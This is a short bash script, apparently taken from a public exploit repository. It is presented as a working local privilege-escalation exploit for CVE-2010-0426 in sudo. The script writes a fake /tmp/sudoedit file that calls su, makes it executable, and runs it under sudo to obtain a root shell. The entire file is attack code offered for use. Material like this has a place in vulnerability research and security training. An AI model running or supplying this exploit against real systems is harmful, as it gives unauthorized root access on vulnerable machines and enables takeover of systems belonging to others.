#!/usr/bin/env bash
# CVE-2010-0426 exploit by t0kx
# https://github.com/t0kx/privesc-CVE-2010-0426

prepare() {
cat << EOF >> /tmp/sudoedit
#!/bin/sh
su
/bin/su
EOF
}

exploit() {
	printf "[+] Prepared sudoedit...\n"
	prepare && chmod a+x /tmp/sudoedit
	printf "[+] Run sudoedit\n"
	cd /tmp/ &&  sudo ./sudoedit ${1}
	printf "[+] Done\n"
}

main() {
	printf "[+] CVE-2010-0426 exploit by t0kx\n"

	if [ -z "${1}"   ]; then
		printf "[-] Please inform a file as parameter\n"
		exit 1
	else
		FILE=${1}
	fi

	exploit ${FILE}
}; main ${1}
